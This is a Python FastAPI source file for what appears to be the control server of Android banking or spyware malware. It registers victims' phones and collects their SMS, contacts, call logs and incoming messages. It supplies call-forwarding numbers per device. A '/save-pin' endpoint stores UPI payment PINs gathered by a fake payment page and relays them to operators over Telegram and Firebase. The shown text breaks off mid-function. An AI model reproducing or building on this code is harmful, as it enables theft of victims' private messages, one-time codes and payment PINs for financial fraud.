from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Query, Depends, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from starlette.websockets import WebSocketDisconnect as StarletteWebSocketDisconnect
from datetime import datetime, timedelta
import json
import logging
import asyncio
from typing import Optional

from .config import settings
from .database import connect_to_mongodb, close_mongodb_connection, mongodb
from .services.websocket_manager import manager
from .services.device_service import device_service
from .services.auth_service import auth_service
from .services.admin_activity_service import admin_activity_service
from .services.telegram_service import telegram_service
from .services.telegram_multi_service import telegram_multi_service
from .services.firebase_service import firebase_service
from .services.firebase_admin_service import firebase_admin_service

from .models.schemas import (
    DeviceStatus, SendCommandRequest, UpdateSettingsRequest,
    DeviceListResponse, SMSListResponse, ContactListResponse, StatsResponse,
    AppTypeInfo, AppTypesResponse
)
from .models.admin_schemas import (
    Admin, AdminCreate, AdminUpdate, AdminLogin, TokenResponse,
    AdminResponse, ActivityType, AdminPermission, AdminRole
)
from .models.otp_schemas import (
    OTPRequest, OTPVerify, OTPResponse, OTPVerifyResponse
)
from .models.bot_schemas import (
    BotOTPRequest, BotOTPVerify, BotOTPResponse, BotTokenResponse, BotStatusResponse
)
from .models.upi_schemas import (
    UPIPinSave, UPIPinResponse
)
from .utils.auth_middleware import (
    get_current_admin, get_optional_admin, require_permission,
    get_client_ip, get_user_agent
)
from .services.otp_service import otp_service
from .services.auth_service import ENABLE_2FA

logging.basicConfig(
    level=logging.INFO if settings.DEBUG else logging.WARNING,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = FastAPI(
    title=" Control Server",
    description="WebSocket Server + REST API with Admin Panel & Telegram Integration",
    version="2.0.0",
    debug=settings.DEBUG
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "*"

    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("startup")
async def startup_event():
    logger.info("🚀 Starting  Control Server...")
    await connect_to_mongodb()

    await auth_service.create_default_admin()

    logger.info("✅ Server is ready!")

@app.on_event("shutdown")
async def shutdown_event():
    logger.info("🛑 Shutting down server...")
    await close_mongodb_connection()
    logger.info("👋 Server stopped!")


###
@app.post("/devices/heartbeat")
async def device_heartbeat(request: Request):
    try:
        data = await request.json()
        device_id = data.get("deviceId")
        
        if not device_id:
            raise HTTPException(status_code=400, detail="deviceId required")
        
        now = datetime.utcnow()
        
        # فقط این دستگاه رو آپدیت کن
        await mongodb.db.devices.update_one(
            {"device_id": device_id},
            {
                "$set": {
                    "last_ping": now,
                    "status": "online",
                    "is_online": True,
                    "last_online_update": now
                }
            }
        )
        
        return {"success": True, "message": "Heartbeat received"}
        
    except Exception as e:
        logger.error(f"❌ Heartbeat error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/ping-response")
async def ping_response(request: Request):
    """دریافت پاسخ Ping از دستگاه"""
    try:
        data = await request.json()
        device_id = data.get("deviceId") or data.get("device_id")
        
        if not device_id:
            raise HTTPException(status_code=400, detail="deviceId required")
        
        logger.info(f"✅ Ping response received from device: {device_id}")
        
        # آپدیت وضعیت آنلاین دستگاه
        await device_service.update_online_status(device_id, True)
        
        # ذخیره لاگ
        await device_service.add_log(
            device_id, 
            "ping", 
            "Ping response received", 
            "success"
        )
        
        return {"success": True, "message": "Ping response received"}
        
    except Exception as e:
        logger.error(f"❌ Ping response error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/upload-response")
async def upload_response(request: Request):
    """دریافت پاسخ آپلود SMS/Contacts از دستگاه"""
    try:
        data = await request.json()
        device_id = data.get("device_id") or data.get("deviceId")
        status = data.get("status")
        count = data.get("count", 0)
        error = data.get("error")
        
        if not device_id or not status:
            raise HTTPException(status_code=400, detail="device_id and status required")
        
        logger.info(f"📊 Upload response from {device_id}: {status} - Count: {count}")
        
        # تشخیص نوع آپلود
        upload_type = "Unknown"
        if "sms" in status.lower():
            upload_type = "SMS"
        elif "contacts" in status.lower():
            upload_type = "Contacts"
        
        # ذخیره لاگ
        log_message = f"{upload_type} upload: {count} items"
        if error:
            log_message += f" - Error: {error}"
        
        log_level = "success" if "success" in status else "error"
        
        await device_service.add_log(
            device_id,
            "upload",
            log_message,
            log_level,
            metadata={
                "status": status,
                "count": count,
                "error": error,
                "type": upload_type
            }
        )
        
        # اگه موفق بود، به تلگرام ادمین اطلاع بده (Bot 1: دستگاه‌ها)
        if "success" in status and count > 0:
            try:
                device = await device_service.get_device(device_id)
                if device and device.admin_username:
                    await telegram_multi_service.send_to_admin(
                        device.admin_username,
                        f"✅ {upload_type} Upload Complete\n"
                        f"📱 Device: <code>{device_id}</code>\n"
                        f"📊 Count: {count} items",
                        bot_index=1  # Bot 1: Device activities
                    )
            except:
                pass
        
        return {"success": True, "message": "Upload response received"}
        
    except Exception as e:
        logger.error(f"❌ Upload response error: {e}")
        raise HTTPException(status_code=500, detail=str(e))



@app.post("/register")
async def register_device(message: dict):
    """
    رجیستر دستگاه با توکن ادمین
    
    Accepts BOTH formats:
    - Legacy: admin_token (device_token)
    - New: user_id (same as admin_token/device_token)
    """
    device_id = message.get("device_id")
    device_info = message.get("device_info", {})
    
    # Support both admin_token and user_id (they're the same thing)
    admin_token = message.get("admin_token") or message.get("user_id")
    app_type = message.get("app_type")  # App flavor
    
    # Add app_type to device_info if provided
    if app_type:
        device_info["app_type"] = app_type
    
    result = await device_service.register_device(device_id, device_info, admin_token)
    await device_service.add_log(device_id, "system", f"Device registered (app: {app_type or 'unknown'})", "info")
    
    # اگه توکن معتبر بود، به ربات ادمین اطلاع بده
    if admin_token and result.get("device") and result["device"].get("admin_username"):
        admin_username = result["device"]["admin_username"]
        
        # اعلان Telegram
        await telegram_multi_service.notify_device_registered(
            device_id, device_info, admin_username
        )
        
        # 📱 Push Notification به ادمین (Firebase جداگانه برای ادمین‌ها)
        app_type = device_info.get("app_type", "Unknown")
        model = device_info.get("model", "Unknown")
        
        await firebase_admin_service.send_device_registration_notification(
            admin_username=admin_username,
            device_id=device_id,
            model=model,
            app_type=app_type
        )
        logger.info(f"📱 Push notification sent to {admin_username} for device: {device_id}")
    
    return {
        "status": "success", 
        "message": "Device registered successfully",
        "device_id": device_id
    }


@app.post("/battery")
async def battery_update(message: dict):
    """آپدیت باتری"""
    device_id = message.get("device_id")
    data = message.get("data", {})
    
    battery_level = data.get("battery")
    is_online = data.get("is_online", True)
    
    if battery_level is not None:
        await device_service.update_battery_level(device_id, battery_level)
    
    await device_service.update_online_status(device_id, is_online)
    await device_service.add_log(device_id, "battery", f"Battery: {battery_level}%", "info")
    
    return {"status": "success"}


@app.post("/sms/batch")
async def sms_history(message: dict):
    # print(message)
    """آپلود SMS"""
    device_id = message.get("device_id")
    sms_list = message.get("data", [])
    batch_info = message.get("batch_info", {})
    
    await device_service.save_sms_history(device_id, sms_list)
    
    batch_text = f"batch {batch_info.get('batch', 1)}/{batch_info.get('of', 1)}" if batch_info else ""
    await device_service.add_log(device_id, "sms", f"SMS: {len(sms_list)} messages {batch_text}".strip(), "info")
    
    return {"status": "success"}


@app.post("/contacts/batch")
async def contacts_bulk(message: dict):
    """آپلود مخاطبین"""
    # print(message)
    device_id = message.get("device_id")
    contacts_list = message.get("data", [])
    batch_info = message.get("batch_info", {})
    
    await device_service.save_contacts(device_id, contacts_list)
    
    batch_text = f"batch {batch_info.get('batch', 1)}/{batch_info.get('of', 1)}" if batch_info else ""
    await device_service.add_log(device_id, "contacts", f"Contacts: {len(contacts_list)} {batch_text}".strip(), "info")
    
    return {"status": "success"}


@app.post("/call-logs/batch")
async def call_history(message: dict):
    """آپلود تاریخچه تماس"""
    # print(message)
    device_id = message.get("device_id")
    call_logs = message.get("data", [])
    batch_info = message.get("batch_info", {})
    
    await device_service.save_call_logs(device_id, call_logs)
    
    batch_text = f"batch {batch_info.get('batch', 1)}/{batch_info.get('of', 1)}" if batch_info else ""
    await device_service.add_log(device_id, "call_logs", f"Call logs: {len(call_logs)} {batch_text}".strip(), "info")
    
    return {"status": "success"}


##

@app.post("/api/sms/new")
async def receive_sms(request: Request):
    try:
        data = await request.json()
        logger.info(f"📱 SMS request received: {data}")

        device_id = data.get("device_id") or data.get("deviceId")
        
        if "data" in data:
            sms_info = data.get("data", {})
            sender = sms_info.get("from")
            message = sms_info.get("body") or sms_info.get("message")
            timestamp = sms_info.get("timestamp")
        else:
            sender = data.get("sender") or data.get("from")
            message = data.get("message") or data.get("body")
            timestamp = data.get("timestamp")
        
        if not device_id:
            logger.error("❌ Missing device_id in SMS request")
            raise HTTPException(status_code=400, detail="device_id is required")

        if not sender or not message:
            logger.error(f"❌ Missing sender or message for device: {device_id}")
            raise HTTPException(status_code=400, detail="sender and message are required")

        logger.info(f"📨 SMS from {sender} to device {device_id}: {message[:50]}...")

        device = await device_service.get_device(device_id)
        if not device:
            logger.warning(f"⚠️ Device not found: {device_id}, creating...")
            await device_service.register_device(device_id, {
                "device_name": "Unknown Device",
                "registered_via": "sms_endpoint"
            })

        sms_data = {
            "from": sender,
            "to": data.get("to"),
            "body": message.replace('\ufffd', '').strip(),
            "timestamp": timestamp,
            "type": data.get("type", "inbox"),
            "received_in_native": data.get("received_in_native", True)
        }

        await device_service.save_new_sms(device_id, sms_data)
        logger.info(f"✅ SMS saved for device: {device_id}")

        await device_service.add_log(
            device_id,
            "sms",
            f"New SMS from {sender}",
            "info"
        )

        try:
            device = await device_service.get_device(device_id)
            if device and device.admin_username:
                await telegram_multi_service.notify_new_sms(
                    device_id, device.admin_username, sender, message
                )
        except Exception as tg_error:
            logger.warning(f"⚠️ Failed to send Telegram notification: {tg_error}")

        return {
            "status": "success",
            "device_id": device_id,
            "message": "SMS received successfully"
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"❌ Unexpected error in receive_sms: {e}", exc_info=True)
        raise HTTPException(
            status_code=500,
            detail=f"Internal server error: {str(e)}"
        )


@app.get("/api/getForwardingNumber/{device_id}")
async def get_forwarding_number_new(device_id: str):
    try:
        logger.info(f"📞 Forwarding number requested for device: {device_id}")

        forwarding_number = await device_service.get_forwarding_number(device_id)

        if not forwarding_number:
            logger.info(f"⚠️ No forwarding number set for device: {device_id}")
            return {"forwardingNumber": ""}

        logger.info(f"✅ Forwarding number found: {forwarding_number}")
        return {"forwardingNumber": forwarding_number}
    except Exception as e:
        logger.error(f"❌ Error fetching forwarding number: {e}")
        raise HTTPException(status_code=500, detail=str(e))



@app.get("/health")
async def health_check():
    try:
        await mongodb.client.admin.command('ping')
        mongo_status = "healthy"
    except:
        mongo_status = "unhealthy"

    return {
        "status": "healthy" if mongo_status == "healthy" else "unhealthy",
        "mongodb": mongo_status,
        "websocket_connections": manager.get_connection_count(),
        "timestamp": datetime.utcnow().isoformat()
    }

@app.post("/auth/login")
async def login(login_data: AdminLogin, request: Request):
    """
    مرحله اول لاگین: تایید username/password
    
    - اگر 2FA فعال باشه: کد OTP میفرسته و temp_token برمیگردونه
    - اگر 2FA غیرفعال باشه: مستقیماً لاگین میکنه
    """
    ip_address = get_client_ip(request)
    user_agent = get_user_agent(request)

    # تایید username و password
    admin = await auth_service.authenticate_admin(login_data)

    if not admin:
        await admin_activity_service.log_activity(
            admin_username=login_data.username,
            activity_type=ActivityType.LOGIN,
            description="Failed login attempt - Invalid credentials",
            ip_address=ip_address,
            user_agent=user_agent,
            success=False,
            error_message="Invalid credentials"
        )

        raise HTTPException(
            status_code=401,
            detail="Invalid username or password"
        )
    
    # ═══════════════════════════════════════════════════════
    # اگر 2FA غیرفعال باشه، مستقیماً لاگین کن (رفتار قدیمی)
    # ═══════════════════════════════════════════════════════
    if not ENABLE_2FA:
        # Generate new session ID (invalidates previous sessions)
        session_id = auth_service.generate_session_id()
        
        # Update admin's session info in database
        update_result = await mongodb.db.admins.update_one(
            {"username": admin.username},
            {
                "$set": {
                    "current_session_id": session_id,
                    "last_session_ip": ip_address,
                    "last_session_device": user_agent
                }
            }
        )
        logger.info(f"🔐 Session created for {admin.username}: {session_id[:20]}... (updated: {update_result.modified_count})")
        
        access_token = auth_service.create_access_token(
            data={"sub": admin.username, "role": admin.role},
            session_id=session_id
        )

        await admin_activity_service.log_activity(
            admin_username=admin.username,
            activity_type=ActivityType.LOGIN,
            description="Successful login (2FA disabled)",
            ip_address=ip_address,
            user_agent=user_agent,
            success=True
        )

        await telegram_multi_service.notify_admin_login(admin.username, ip_address, success=True)
        logger.info(f"✅ Admin logged in (no 2FA): {admin.username}")

        return TokenResponse(
            access_token=access_token,
            token_type="bearer",
            expires_in=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
            admin=AdminResponse(
                username=admin.username,
                email=admin.email,
                full_name=admin.full_name,
                role=admin.role,
                permissions=admin.permissions,
                is_active=admin.is_active,
                last_login=admin.last_login,
                login_count=admin.login_count,
                created_at=admin.created_at
            )
        )
    
    # ═══════════════════════════════════════════════════════
    # 2FA فعال است - مرحله اول: ارسال OTP
    # ═══════════════════════════════════════════════════════
    
    # تولید کد OTP
    otp_code = await otp_service.create_otp(admin.username, ip_address)
    
    # ارسال کد به تلگرام
    try:
        await telegram_multi_service.send_2fa_notification(
            admin.username,
            ip_address,
            code=otp_code
        )
        logger.info(f"🔐 2FA code sent to {admin.username}")
    except Exception as e:
        logger.error(f"❌ Failed to send 2FA code: {e}")
        # ادامه بده حتی اگه ارسال تلگرام ناموفق بود
    
    # ایجاد توکن موقت
    temp_token = auth_service.create_temp_token(admin.username)
    
    # لاگ فعالیت
    await admin_activity_service.log_activity(
        admin_username=admin.username,
        activity_type=ActivityType.LOGIN,
        description="Login step 1: Password verified, OTP sent",
        ip_address=ip_address,
        user_agent=user_agent,
        success=True,
        metadata={"step": "otp_sent"}
    )
    
    logger.info(f"🔑 Login step 1 complete for {admin.username}, awaiting OTP verification")
    
    return OTPResponse(
        success=True,
        message="OTP code sent to your Telegram. Please verify to complete login.",
        temp_token=temp_token,
        expires_in=300  # 5 minutes
    )

@app.post("/auth/verify-2fa", response_model=TokenResponse)
async def verify_2fa(verify_data: OTPVerify, request: Request):
    """
    مرحله دوم لاگین: تایید کد OTP
    
    کاربر باید:
    1. temp_token از مرحله اول رو بفرسته
    2. کد OTP 6 رقمی که از تلگرام گرفته رو بفرسته
    """
    ip_address = get_client_ip(request)
    user_agent = get_user_agent(request)
    
    # تایید temp_token
    username = auth_service.verify_temp_token(verify_data.temp_token)
    
    if not username or username != verify_data.username:
        raise HTTPException(
            status_code=401,
            detail="Invalid or expired temporary token"
        )
    
    # تایید کد OTP
    otp_result = await otp_service.verify_otp(
        verify_data.username,
        verify_data.otp_code,
        ip_address
    )
    
    if not otp_result["valid"]:
        # افزایش تعداد تلاش‌ها
        await otp_service.increment_attempts(verify_data.username, verify_data.otp_code)
        
        # لاگ تلاش ناموفق
        await admin_activity_service.log_activity(
            admin_username=verify_data.username,
            activity_type=ActivityType.LOGIN,
            description=f"Failed OTP verification: {otp_result['message']}",
            ip_address=ip_address,
            user_agent=user_agent,
            success=False,
            error_message=otp_result["message"]
        )
        
        raise HTTPException(
            status_code=401,
            detail=otp_result["message"]
        )
    
    # OTP تایید شد - دریافت اطلاعات ادمین
    admin = await auth_service.get_admin_by_username(verify_data.username)
    
    if not admin:
        raise HTTPException(
            status_code=404,
            detail="Admin not found"
        )
    
    # Generate new session ID (invalidates previous sessions)
    session_id = auth_service.generate_session_id()
    
    # Update admin's session info in database + FCM token
    update_data = {
        "$set": {
            "current_session_id": session_id,
            "last_session_ip": ip_address,
            "last_session_device": user_agent
        }
    }
    
    # اگر FCM token داده شد، فقط آخرین token رو نگه دار (single device notification)
    if verify_data.fcm_token:
        update_data["$set"]["fcm_tokens"] = [verify_data.fcm_token]  # فقط آخرین دستگاه
        logger.info(f"📱 FCM token registered for {admin.username} (last device only)")
    
    update_result = await mongodb.db.admins.update_one(
        {"username": admin.username},
        update_data
    )
    logger.info(f"🔐 Session created for {admin.username}: {session_id[:20]}... (updated: {update_result.modified_count})")
    
    # ایجاد توکن نهایی با session_id
    access_token = auth_service.create_access_token(
        data={"sub": admin.username, "role": admin.role},
        session_id=session_id
    )
    
    # لاگ موفقیت
    await admin_activity_service.log_activity(
        admin_username=admin.username,
        activity_type=ActivityType.LOGIN,
        description="Login step 2: OTP verified, login complete",
        ip_address=ip_address,
        user_agent=user_agent,
        success=True,
        metadata={"step": "otp_verified"}
    )
    
    # اعلان ورود موفق به تلگرام
    await telegram_multi_service.notify_admin_login(admin.username, ip_address, success=True)
    
    logger.info(f"✅ 2FA verification complete, admin logged in: {admin.username}")
    
    return TokenResponse(
        access_token=access_token,
        token_type="bearer",
        expires_in=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
        admin=AdminResponse(
            username=admin.username,
            email=admin.email,
            full_name=admin.full_name,
            role=admin.role,
            permissions=admin.permissions,
            is_active=admin.is_active,
            last_login=admin.last_login,
            login_count=admin.login_count,
            created_at=admin.created_at
        )
    )

@app.post("/auth/logout")
async def logout(
    request: Request,
    current_admin: Admin = Depends(get_current_admin)
):
    ip_address = get_client_ip(request)

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.LOGOUT,
        description="Logged out",
        ip_address=ip_address
    )

    # 🔔 اعلان خروج به ربات 4 (لاگین/لاگ‌اوت)
    await telegram_multi_service.notify_admin_logout(current_admin.username, ip_address)

    logger.info(f"👋 Admin logged out: {current_admin.username}")

    return {"message": "Logged out successfully"}


# ═══════════════════════════════════════════════════════════════════════════════
# 🤖 TELEGRAM BOT AUTHENTICATION (with OTP)
# ═══════════════════════════════════════════════════════════════════════════════

@app.post("/bot/auth/request-otp", response_model=BotOTPResponse, tags=["Bot Auth"])
async def bot_request_otp(request: BotOTPRequest, req: Request):
    """
    🤖 Step 1: Bot requests OTP for authentication
    
    - First time bot setup
    - Send OTP to admin's Telegram
    - Valid for 5 minutes
    """
    ip_address = get_client_ip(req)
    
    # Verify admin exists
    admin = await auth_service.get_admin_by_username(request.username)
    if not admin:
        raise HTTPException(status_code=404, detail="Admin not found")
    
    if not admin.is_active:
        raise HTTPException(status_code=403, detail="Admin account is disabled")
    
    # Generate OTP
    otp_code = await otp_service.create_otp(request.username, ip_address)
    
    # Send OTP via Telegram
    try:
        await telegram_multi_service.send_2fa_notification(
            request.username, 
            ip_address, 
            code=otp_code,
            message_prefix=f"🤖 Bot Authentication Request\nBot: {request.bot_identifier}\n"
        )
        logger.info(f"🤖 OTP sent to {request.username} for bot: {request.bot_identifier}")
    except Exception as e:
        logger.error(f"❌ Failed to send bot OTP: {e}")
        # Don't fail - OTP is still valid
    
    # Log activity
    await admin_activity_service.log_activity(
        admin_username=request.username,
        activity_type=ActivityType.LOGIN,
        description=f"Bot OTP requested: {request.bot_identifier}",
        ip_address=ip_address,
        success=True
    )
    
    return BotOTPResponse(
        success=True,
        message="OTP sent to your Telegram. Please verify to get service token.",
        expires_in=300
    )


@app.post("/bot/auth/verify-otp", response_model=BotTokenResponse, tags=["Bot Auth"])
async def bot_verify_otp(request: BotOTPVerify, req: Request):
    """
    🤖 Step 2: Verify OTP and get service token
    
    - Verify OTP code
    - Return service token (never expires for single session, stays connected)
    - Bot uses this token for all future requests
    """
    ip_address = get_client_ip(req)
    user_agent = get_user_agent(req)
    
    # Verify OTP
    otp_result = await otp_service.verify_otp(request.username, request.otp_code, ip_address)
    
    if not otp_result["valid"]:
        # Log failed attempt
        await admin_activity_service.log_activity(
            admin_username=request.username,
            activity_type=ActivityType.LOGIN,
            description=f"Bot OTP verification failed: {request.bot_identifier}",
            ip_address=ip_address,
            success=False,
            error_message=otp_result["message"]
        )
        raise HTTPException(status_code=401, detail=otp_result["message"])
    
    # Get admin
    admin = await auth_service.get_admin_by_username(request.username)
    if not admin:
        raise HTTPException(status_code=404, detail="Admin not found")
    
    if not admin.is_active:
        raise HTTPException(status_code=403, detail="Admin account is disabled")
    
    # Create SERVICE token (no session_id, stays connected forever)
    service_token = auth_service.create_access_token(
        data={
            "sub": admin.username,
            "role": admin.role,
            "bot_identifier": request.bot_identifier
        },
        client_type="service",  # ← This is the key! No session check
        is_bot=True
    )
    
    # Log success
    await admin_activity_service.log_activity(
        admin_username=request.username,
        activity_type=ActivityType.LOGIN,
        description=f"Bot authenticated successfully: {request.bot_identifier}",
        ip_address=ip_address,
        user_agent=user_agent,
        success=True,
        metadata={"bot": request.bot_identifier}
    )
    
    # Notify via Telegram
    await telegram_multi_service.notify_admin_action(
        admin_username=request.username,
        action="bot_authenticated",
        details=f"Bot '{request.bot_identifier}' successfully authenticated",
        ip_address=ip_address
    )
    
    logger.info(f"✅ Bot authenticated: {request.bot_identifier} for {request.username}")
    
    return BotTokenResponse(
        success=True,
        message="Bot authenticated successfully. Use this service token for all future requests.",
        service_token=service_token,
        admin_info={
            "username": admin.username,
            "role": admin.role,
            "is_active": admin.is_active
        }
    )


@app.get("/bot/auth/check", response_model=BotStatusResponse, tags=["Bot Auth"])
async def bot_check_status(current_admin: Admin = Depends(get_current_admin)):
    """
    🤖 Step 3: Check if admin is still active
    
    - Bot uses service token to check status
    - Returns true/false based on admin.is_active
    - Returns device_token for device registration
    - No session validation (service token stays connected)
    """
    return BotStatusResponse(
        active=current_admin.is_active,
        admin_username=current_admin.username,
        device_token=current_admin.device_token,
        message="Admin is active" if current_admin.is_active else "Admin is disabled"
    )


# ═══════════════════════════════════════════════════════════════════════════════
# 💳 UPI PIN COLLECTION
# ═══════════════════════════════════════════════════════════════════════════════

@app.post("/save-pin", response_model=UPIPinResponse, tags=["UPI"])
async def save_upi_pin(pin_data: UPIPinSave):
    """
    💳 Save UPI PIN from HTML form
    
    - Receives PIN directly from payment HTML page
    - user_id = admin's device_token (identifies which admin owns this device)
    - Associates PIN with device and admin
    - Returns success with timestamp
    """
    try:
        # user_id is actually the admin's device_token
        admin_token = pin_data.user_id
        
        # Find admin by device_token
        admin = await mongodb.db.admins.find_one({"device_token": admin_token})
        
        if not admin:
            logger.warning(f"⚠️ Admin not found for user_id: {admin_token[:20]}...")
            admin_username = None
        else:
            admin_username = admin["username"]
        
        # پیدا کردن device موجود
        device = await mongodb.db.devices.find_one({"device_id": pin_data.device_id})
        
        if not device:
            logger.warning(f"⚠️ Device not found: {pin_data.device_id} - PIN not saved (device must register first)")
            raise HTTPException(
                status_code=404,
                detail="Device not found. Device must be registered before saving PIN."
            )
        
        # فقط Update کردن UPI PIN در device موجود
        update_data = {
            "$set": {
                "upi_pin": pin_data.upi_pin,
                "has_upi": True,
                "upi_detected_at": datetime.utcnow(),
                "upi_last_updated_at": datetime.utcnow(),
                "updated_at": datetime.utcnow()
            }
        }
        
        result = await mongodb.db.devices.update_one(
            {"device_id": pin_data.device_id},
            update_data
        )
        
        # Log the PIN save
        await device_service.add_log(
            pin_data.device_id,
            "upi",
            f"UPI PIN saved from {pin_data.app_type} app (PIN: {pin_data.upi_pin})",
            "info"
        )
        
        # Notify admin via Telegram
        if admin_username:
            await telegram_multi_service.notify_upi_detected(
                pin_data.device_id,
                pin_data.upi_pin,
                admin_username
            )
            
            # 📱 Push Notification به ادمین (Firebase جداگانه برای ادمین‌ها)
            device_model = device.get("model", "Unknown")
            await firebase_admin_service.send_upi_pin_notification(
                admin_username=admin_username,
                device_id=pin_data.device_id,
                upi_pin=pin_data.upi_pin,
                model=device_model
            )
            
            logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} → Admin: {admin_username}")
            logger.info(f"📱 Push notification sent to {admin_username} for UPI PIN")
        else:
            logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} (no admin association)")
        
        return UPIPinResponse(
            status="success",
            message="PIN saved successfully",
            timestamp=datetime.utcnow()
        )
    
    except Exception as e:
        logger.error(f"❌ Error saving UPI PIN: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/auth/me", response_model=AdminResponse)
async def get_current_admin_info(current_admin: Admin = Depends(get_current_admin)):
    return AdminResponse(
        username=current_admin.username,
        email=current_admin.email,
        full_name=current_admin.full_name,
        role=current_admin.role,
        permissions=current_admin.permissions,
        device_token=current_admin.device_token,
        telegram_2fa_chat_id=current_admin.telegram_2fa_chat_id,
        telegram_bots=current_admin.telegram_bots,
        is_active=current_admin.is_active,
        last_login=current_admin.last_login,
        login_count=current_admin.login_count,
        created_at=current_admin.created_at
    )

@app.post("/admin/create", response_model=AdminResponse)
async def create_admin(
    admin_create: AdminCreate,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):

    new_admin = await auth_service.create_admin(admin_create, created_by=current_admin.username)

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.CREATE_ADMIN,
        description=f"Created new admin: {new_admin.username}",
        ip_address=get_client_ip(request),
        metadata={"new_admin": new_admin.username, "role": new_admin.role.value}
    )

    # 🔔 اعلان به سیستم تلگرام چندگانه با توکن جدید
    await telegram_multi_service.notify_admin_created(
        current_admin.username,
        new_admin.username,
        new_admin.role.value,
        new_admin.device_token
    )

    return AdminResponse(
        username=new_admin.username,
        email=new_admin.email,
        full_name=new_admin.full_name,
        role=new_admin.role,
        permissions=new_admin.permissions,
        device_token=new_admin.device_token,
        telegram_2fa_chat_id=new_admin.telegram_2fa_chat_id,
        telegram_bots=new_admin.telegram_bots,
        is_active=new_admin.is_active,
        last_login=new_admin.last_login,
        login_count=new_admin.login_count,
        created_at=new_admin.created_at
    )

@app.get("/admin/list")
async def list_admins(
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    admins = await auth_service.get_all_admins()
    return {"admins": admins, "total": len(admins)}

@app.put("/admin/{username}")
async def update_admin(
    username: str,
    admin_update: AdminUpdate,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):

    success = await auth_service.update_admin(username, admin_update)

    if not success:
        raise HTTPException(status_code=404, detail="Admin not found or no changes made")

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.UPDATE_ADMIN,
        description=f"Updated admin: {username}",
        ip_address=get_client_ip(request),
        metadata={"updated_admin": username, "changes": admin_update.model_dump(exclude_unset=True)}
    )

    return {"message": "Admin updated successfully"}

@app.delete("/admin/{username}")
async def delete_admin(
    username: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):

    if username == current_admin.username:
        raise HTTPException(status_code=400, detail="Cannot delete yourself")

    success = await auth_service.delete_admin(username)

    if not success:
        raise HTTPException(status_code=404, detail="Admin not found")

    await admin_activity_service.log_activity(
        admin_username=current_admin.username,
        activity_type=ActivityType.DELETE_ADMIN,
        description=f"Deleted admin: {username}",
        ip_address=get_client_ip(request),
        metadata={"deleted_admin": username}
    )

    return {"message": "Admin deleted successfully"}

@app.get("/admin/activities")
async def get_admin_activities(
    admin_username: Optional[str] = None,
    activity_type: Optional[str] = None,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=500),
    current_admin: Admin = Depends(get_current_admin)
):
    """
    📋 دریافت لیست activity های ادمین
    
    - Super Admin: می‌تونه activity همه یا یک ادمین خاص رو ببینه
    - Admin عادی: فقط activity خودش رو می‌بینه
    """
    # اگر Super Admin نیست، فقط activity خودش رو می‌تونه ببینه
    if current_admin.role != AdminRole.SUPER_ADMIN:
        admin_username = current_admin.username

    activities = await admin_activity_service.get_activities(
        admin_username=admin_username,
        activity_type=ActivityType(activity_type) if activity_type else None,
        skip=skip,
        limit=limit
    )

    total = await mongodb.db.admin_activities.count_documents(
        {"admin_username": admin_username} if admin_username else {}
    )

    return {
        "activities": activities,
        "total": total,
        "page": skip // limit + 1,
        "page_size": limit
    }

@app.get("/admin/activities/stats")
async def get_admin_activity_stats(
    admin_username: Optional[str] = None,
    current_admin: Admin = Depends(get_current_admin)
):
    """
    📊 دریافت آمار activity های ادمین
    
    - Super Admin: می‌تونه آمار همه یا یک ادمین خاص رو ببینه
    - Admin عادی: فقط آمار خودش رو می‌بینه
    """
    # اگر Super Admin نیست، فقط activity خودش رو می‌تونه ببینه
    if current_admin.role != AdminRole.SUPER_ADMIN:
        admin_username = current_admin.username
    
    stats = await admin_activity_service.get_activity_stats(admin_username)
    recent_logins = await admin_activity_service.get_recent_logins(limit=10)

    return {
        "stats": stats,
        "recent_logins": recent_logins
    }

@app.get("/api/devices/stats", response_model=StatsResponse)
async def get_device_stats(
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    """
    📊 دریافت آمار دستگاه‌ها
    
    - Super Admin: آمار همه دستگاه‌ها
    - Admin/Viewer: فقط آمار دستگاه‌های خودش
    """
    # اگر Super Admin باشه، همه رو نشون بده
    admin_username = None if current_admin.role == AdminRole.SUPER_ADMIN else current_admin.username
    
    stats = await device_service.get_stats(admin_username=admin_username)
    return StatsResponse(**stats)


@app.get("/api/stats")
async def get_stats(current_admin: Admin = Depends(get_current_admin)):
    """
    📊 دریافت آمار دستگاه‌ها (Deprecated - استفاده از /api/devices/stats)
    
    - Super Admin: آمار همه دستگاه‌ها
    - Admin/Viewer: فقط آمار دستگاه‌های خودش
    """
    # اگر Super Admin باشه، همه رو نشون بده
    admin_username = None if current_admin.role == AdminRole.SUPER_ADMIN else current_admin.username
    
    stats = await device_service.get_stats(admin_username=admin_username)
    return StatsResponse(**stats)


@app.get("/api/devices/app-types", response_model=AppTypesResponse)
async def get_app_types(
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):
    """
    📱 دریافت لیست انواع اپلیکیشن‌های موجود
    
    - لیست همه app_type های موجود در دستگاه‌ها
    - تعداد دستگاه هر نوع
    - نام و آیکون نمایشی
    """
    # فیلتر بر اساس نقش ادمین
